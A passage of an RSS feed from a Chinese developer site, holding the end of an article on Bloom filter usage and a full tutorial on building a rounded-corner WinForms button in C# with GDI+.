<span class="hljs-bullet">4.</span> 是否需要删除或更新元素？
   └─ 是 → 考虑 Cuckoo Filter 或定期重建
   └─ 否 → 布隆过滤器完美匹配
</code></pre>
<h3 data-id="heading-41">8.3 使用建议</h3>
<p><strong>什么时候用布隆过滤器：</strong></p>
<ul>
<li>数据量大（百万级以上）</li>
<li>允许一定的误判</li>
<li>主要用于判断"不存在"</li>
<li>对内存敏感</li>
</ul>
<p><strong>什么时候不用：</strong></p>
<ul>
<li>数据量小（直接用HashSet）</li>
<li>需要100%准确</li>
<li>需要删除或更新元素</li>
<li>需要持久化全部数据</li>
</ul>
<h3 data-id="heading-42">8.4 最佳实践</h3>
<ol>
<li><strong>预估准确</strong>：预期数量 × 1.5倍</li>
<li><strong>定期重建</strong>：避免误判率上升</li>
<li><strong>监控指标</strong>：实际数量、误判率、内存占用</li>
<li><strong>分布式用Redis</strong>：避免数据不一致</li>
<li><strong>降级方案</strong>：过滤器失效时的兜底策略</li>
</ol>
<h3 data-id="heading-43">8.5 进阶方向</h3>
<p>如果这些基础的布隆过滤器不能满足需求，可以研究：</p>
<ul>
<li>Counting Bloom Filter（支持删除）</li>
<li>Scalable Bloom Filter（动态扩容）</li>
<li>Cuckoo Filter（更低误判率，支持删除）</li>
</ul>
<p>但对于大部分业务场景，Guava的基础实现已经足够了。</p>
<hr/>
<p><strong>最后说一句：</strong> 布隆过滤器不是银弹，但它是在"空间、速度、准确性"三角中，一个极其优雅的折中。真正的工程智慧，不在于知道多少算法，而在于知道何时用哪个工具。</p>
<p>希望这篇文章能帮你避开90%工程师踩过的坑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WinForm 中实现高质量自定义圆角按钮控件]]></title>    <link>https://juejin.cn/post/7581888578507423771</link>    <guid>https://juejin.cn/post/7581888578507423771</guid>    <pubDate>2025-12-10T01:35:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507423771" data-draft-id="7516751639666442276" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WinForm 中实现高质量自定义圆角按钮控件"/> <meta itemprop="keywords" content="后端,.NET,C#"/> <meta itemprop="datePublished" content="2025-12-10T01:35:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小码编匠"/> <meta itemprop="url" content="https://juejin.cn/user/1308876155395739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WinForm 中实现高质量自定义圆角按钮控件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1308876155395739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小码编匠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:35:04.000Z" title="Wed Dec 10 2025 01:35:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>WinForm开发中，默认的Button控件外观比较单调，且圆角效果显示质量较差。为了提升界面美观度和用户体验，本文将介绍如何使用GDI+创建一个高质量的自定义圆角按钮控件。该控件参考了YouTube上一位大神的设计思路，采用双层绘制机制，实现了平滑的圆角渲染和多种自定义功能。</p>
<h3 data-id="heading-1">正文</h3>
<h4 data-id="heading-2">主要特性</h4>
<ul>
<li>
<p>可自定义边框大小</p>
</li>
<li>
<p>可自定义圆角半径</p>
</li>
<li>
<p>可自定义边框颜色</p>
</li>
<li>
<p>支持背景色和文本颜色设置</p>
</li>
<li>
<p>平滑的圆角渲染效果</p>
</li>
</ul>
<p>这些特性使得控件可以灵活适应不同UI设计需求，同时保证视觉上的高品质表现。</p>
<h4 data-id="heading-3">实现步骤</h4>
<h4 data-id="heading-4">创建自定义按钮类</h4>
<p>首先，我们需要创建一个继承自<code>Button</code>的自定义类：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System.Windows.Forms;
<span class="hljs-keyword">using</span> System.Drawing;
<span class="hljs-keyword">using</span> System.Drawing.Drawing2D;
<span class="hljs-keyword">using</span> System.ComponentModel;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">RoundButton</span> : <span class="hljs-title">Button</span>
{
    <span class="hljs-comment">// 字段定义</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> borderSize = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> borderRadius = <span class="hljs-number">20</span>;
    <span class="hljs-keyword">private</span> Color borderColor = Color.PaleVioletRed;
}
</code></pre>
<h4 data-id="heading-5">添加属性</h4>
<p>接下来为按钮添加可配置的属性，包括边框大小、圆角半径、边框颜色、背景色和文本颜色，并在每次修改时调用<code>Invalidate()</code>方法以触发重绘。</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> BorderSize
{
    <span class="hljs-keyword">get</span> =&gt; borderSize;
    <span class="hljs-keyword">set</span>
    {
        borderSize = <span class="hljs-keyword">value</span>;
        Invalidate();
    }
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> BorderRadius
{
    <span class="hljs-keyword">get</span> =&gt; borderRadius;
    <span class="hljs-keyword">set</span>
    {
        borderRadius = <span class="hljs-keyword">value</span>;
        Invalidate();
    }
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> Color BorderColor
{
    <span class="hljs-keyword">get</span> =&gt; borderColor;
    <span class="hljs-keyword">set</span>
    {
        borderColor = <span class="hljs-keyword">value</span>;
        Invalidate();
    }
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> Color BackgroundColor
{
    <span class="hljs-keyword">get</span> =&gt; BackColor;
    <span class="hljs-keyword">set</span> =&gt; BackColor = <span class="hljs-keyword">value</span>;
}

[<span class="hljs-meta">Category(<span class="hljs-string">"Round Button"</span>)</span>]
<span class="hljs-keyword">public</span> Color TextColor
{
    <span class="hljs-keyword">get</span> =&gt; ForeColor;
    <span class="hljs-keyword">set</span> =&gt; ForeColor = <span class="hljs-keyword">value</span>;
}
</code></pre>
<h4 data-id="heading-6">构造函数实现</h4>
<p>在构造函数中设置按钮的默认样式、尺寸和颜色，并绑定<code>Resize</code>事件以确保圆角不超过按钮高度。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">RoundButton</span>()</span>
{
    FlatStyle = FlatStyle.Flat;
    FlatAppearance.BorderSize = <span class="hljs-number">0</span>;
    Size = <span class="hljs-keyword">new</span> Size(<span class="hljs-number">150</span>, <span class="hljs-number">40</span>);
    BackColor = Color.MediumSlateBlue;
    ForeColor = Color.White;
    Resize += <span class="hljs-keyword">new</span> EventHandler(Button_Resize);
}

<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Button_Resize</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    <span class="hljs-keyword">if</span> (borderRadius &gt; Height)
        borderRadius = Height;
}
</code></pre>
<h4 data-id="heading-7">圆角路径生成</h4>
<p>通过<code>GraphicsPath</code>对象实现圆角图形路径的生成，支持左上、右上、右下、左下四个方向的弧线绘制。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> GraphicsPath <span class="hljs-title">GetFigurePath</span>(<span class="hljs-params">Rectangle rect, <span class="hljs-built_in">float</span> radius</span>)</span>
{
    GraphicsPath path = <span class="hljs-keyword">new</span> GraphicsPath();
    <span class="hljs-built_in">float</span> curveSize = radius * <span class="hljs-number">2F</span>;
    path.StartFigure();
    <span class="hljs-comment">// 左上角</span>
    path.AddArc(rect.X, rect.Y, curveSize, curveSize, <span class="hljs-number">180</span>, <span class="hljs-number">90</span>);
    <span class="hljs-comment">// 右上角</span>
    path.AddArc(rect.Right - curveSize, rect.Y, curveSize, curveSize, <span class="hljs-number">270</span>, <span class="hljs-number">90</span>);
    <span class="hljs-comment">// 右下角</span>
    path.AddArc(rect.Right - curveSize, rect.Bottom - curveSize, curveSize, curveSize, <span class="hljs-number">0</span>, <span class="hljs-number">90</span>);
    <span class="hljs-comment">// 左下角</span>
    path.AddArc(rect.X, rect.Bottom - curveSize, curveSize, curveSize, <span class="hljs-number">90</span>, <span class="hljs-number">90</span>);
    path.CloseFigure();
    <span class="hljs-keyword">return</span> path;
}
</code></pre>
<h4 data-id="heading-8">重写OnPaint方法</h4>
<p>核心绘制逻辑位于<code>OnPaint</code>方法中，采用双层绘制机制：外层路径用于按钮整体形状与边缘抗锯齿处理，内层路径用于边框绘制。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPaint</span>(<span class="hljs-params">PaintEventArgs pevent</span>)</span>
{
    <span class="hljs-keyword">base</span>.OnPaint(pevent);
    Rectangle rectSurface = ClientRectangle;
    Rectangle rectBorder = Rectangle.Inflate(rectSurface, -borderSize, -borderSize);
    <span class="hljs-built_in">int</span> smoothSize = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">if</span> (borderSize &gt; <span class="hljs-number">0</span>)
        smoothSize = borderSize;
    <span class="hljs-keyword">if</span> (borderRadius &gt; <span class="hljs-number">2</span>) <span class="hljs-comment">// 圆角按钮</span>
    {
        <span class="hljs-keyword">using</span> (GraphicsPath pathSurface = GetFigurePath(rectSurface, borderRadius))
        <span class="hljs-keyword">using</span> (GraphicsPath pathBorder = GetFigurePath(rectBorder, borderRadius - borderSize))
        <span class="hljs-keyword">using</span> (Pen penSurface = <span class="hljs-keyword">new</span> Pen(Parent.BackColor, smoothSize))
        <span class="hljs-keyword">using</span> (Pen penBorder = <span class="hljs-keyword">new</span> Pen(borderColor, borderSize))
        {
            pevent.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
            Region = <span class="hljs-keyword">new</span> Region(pathSurface);
            pevent.Graphics.DrawPath(penSurface, pathSurface);
            <span class="hljs-keyword">if</span> (borderSize &gt;= <span class="hljs-number">1</span>)
                pevent.Graphics.DrawPath(penBorder, pathBorder);
        }
    }
    <span class="hljs-keyword">else</span> <span class="hljs-comment">// 普通按钮</span>
    {
        pevent.Graphics.SmoothingMode = SmoothingMode.None;
        Region = <span class="hljs-keyword">new</span> Region(rectSurface);
        <span class="hljs-keyword">if</span> (borderSize &gt;= <span class="hljs-number">1</span>)
        {
            <span class="hljs-keyword">using</span> (Pen penBorder = <span class="hljs-keyword">new</span> Pen(borderColor, borderSize))
            {
                penBorder.Alignment = PenAlignment.Inset;
                pevent.Graphics.DrawRectangle(penBorder, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, Width - <span class="hljs-number">1</span>, Height - <span class="hljs-number">1</span>);
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-9">处理父容器颜色变化</h4>
<p>为确保按钮在父容器背景颜色变化时能正确刷新，需监听<code>BackColorChanged</code>事件并调用<code>Invalidate()</code>。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnHandleCreated</span>(<span class="hljs-params">EventArgs e</span>)</span>
{
    <span class="hljs-keyword">base</span>.OnHandleCreated(e);
    Parent.BackColorChanged += Container_BackColorChanged;
}

<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Container_BackColorChanged</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    Invalidate();
}
</code></pre>
<h3 data-id="heading-10">双层绘制机制详解</h3>
<p>外层路径(<code>pathSurface</code>)：定义按钮的整体形状，并用于绘制边缘抗锯齿线条。</p>
<p>内层路径(<code>pathBorder</code>)：根据边框大小计算出内部矩形区域，并用于绘制实际的边框。</p>
<p>代码示例：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPaint</span>(<span class="hljs-params">PaintEventArgs pevent</span>)</span>
{
    <span class="hljs-keyword">base</span>.OnPaint(pevent);
    Rectangle rectSurface = ClientRectangle;
    Rectangle rectBorder = Rectangle.Inflate(rectSurface, -borderSize, -borderSize);
    <span class="hljs-built_in">int</span> smoothSize = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">if</span> (borderSize &gt; <span class="hljs-number">0</span>) smoothSize = borderSize;

    <span class="hljs-keyword">if</span> (borderRadius &gt; <span class="hljs-number">2</span>)
    {
        <span class="hljs-keyword">using</span> (GraphicsPath pathSurface = GetFigurePath(rectSurface, borderRadius))
        <span class="hljs-keyword">using</span> (GraphicsPath pathBorder = GetFigurePath(rectBorder, borderRadius - borderSize))
        <span class="hljs-keyword">using</span> (Pen penSurface = <span class="hljs-keyword">new</span> Pen(Parent.BackColor, smoothSize))
        <span class="hljs-keyword">using</span> (Pen penBorder = <span class="hljs-keyword">new</span> Pen(borderColor, borderSize))
        {
            pevent.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
            Region = <span class="hljs-keyword">new</span> Region(pathSurface);
            pevent.Graphics.DrawPath(penSurface, pathSurface);
            <span class="hljs-keyword">if</span> (borderSize &gt;= <span class="hljs-number">1</span>)
                pevent.Graphics.DrawPath(penBorder, pathBorder);
        }
    }
}
</code></pre>
<h3 data-id="heading-11">总结</h3>
<p>通过继承<code>Button</code>类并结合GDI+绘图技术，我们成功实现了一个功能丰富、视觉效果出色的<strong>自定义圆角按钮控件</strong>。</p>
<p>该控件不仅具备良好的扩展性，还采用了双层绘制机制，确保了圆角的平滑性和边框的准确性。</p>
<p>可以根据项目需求自由调整边框大小、圆角半径、颜色等参数，从而满足多样化的UI设计需求。</p>
<h3 data-id="heading-12">关键词</h3>
<p>WinForms、GDI+、自定义控件、圆角按钮、双层绘制、抗锯齿、GraphicsPath、Pen、SmoothingMode、Region</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db8d8df90c0b4320898f7b24dbdd9ed3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP56CB57yW5Yyg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935304&amp;x-signature=imxfGrEO0atzYi2i%2B7MchxLqb0s%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">最后</h3>
<p>如果你觉得这篇文章对你有帮助，不妨点个赞支持一下！你的支持是我继续分享知识的动力。如果有任何疑问或需要进一步的帮助，欢迎随时留言。</p>
<p>也可以加入微信公众号 <strong>[DotNet技术匠]</strong> 社区，与其他热爱技术的同行一起交流心得，共同成长！</p>
<p><strong>优秀是一种习惯，欢迎大家留言学习！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>